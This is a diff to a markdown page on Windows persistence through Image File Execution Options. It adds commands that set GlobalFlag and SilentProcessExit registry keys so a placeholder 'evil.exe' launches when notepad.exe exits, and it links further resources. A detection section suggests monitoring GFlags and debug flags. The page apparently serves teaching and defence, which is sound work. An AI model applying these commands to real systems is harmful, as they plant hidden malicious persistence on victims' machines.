@@ -26,7 +26,17 @@ Executing malicious content triggered by Image File Execution Options
 6. When the Program you made the registry key for is executed. The name of the key is passed to the Value(Path to the executable on victim) you supplied in the powershell script as an argument. Then that executable is ran.  
 
 ---
+## Alternative Exploit Syntax
+ ```powershell
+sharpreg create "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
 
+sharpreg create "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
+
+
+# Replace the last argument with the location of the file you would like to run when the process is closed
+sharpreg create "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\evil.exe"
+```
+---
 ## Detection Technique:
 * Monitor for abnormal usage of the GFlags tool as well as common processes spawned under abnormal parents and/or with creation flags indicative of debugging such as DEBUG_PROCESS and DEBUG_ONLY_THIS_PROCESS
 
@@ -38,4 +48,10 @@ Executing malicious content triggered by Image File Execution Options
 ---
 
 ## Resources
+ Method1:
  [Image File Execution Options Explained](https://www.youtube.com/watch?v=-hz0PTVa0k4&t=182s)
+
+ Method2:
+ [Persistence using globalflags in image file execution options](https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/)
+
+ 
